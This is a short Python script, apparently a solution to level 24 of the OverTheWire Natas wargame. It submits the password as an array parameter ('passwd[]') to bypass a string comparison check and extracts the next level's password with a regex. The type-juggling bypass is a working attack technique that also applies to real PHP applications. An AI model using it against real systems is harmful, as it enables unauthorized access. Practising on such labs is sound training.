import sys
import requests
import re

def bruteforce_user_password():

    url = "http://natas24.natas.labs.overthewire.org"

    auth=("natas24",sys.argv[1])

    response = requests.get(
        url,
        auth=auth,
        params={
            "passwd[]": "11iloveyou",
        },
        timeout=10)

    if "wrong" not in response.text.lower():

        pattern = re.compile(r"Password: [a-zA-z0-9]{32}")
        match = pattern.search(response.text)

        if match:
            print(match.group())

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[+] Usage python.py <file.py> natas_password")
    bruteforce_user_password()
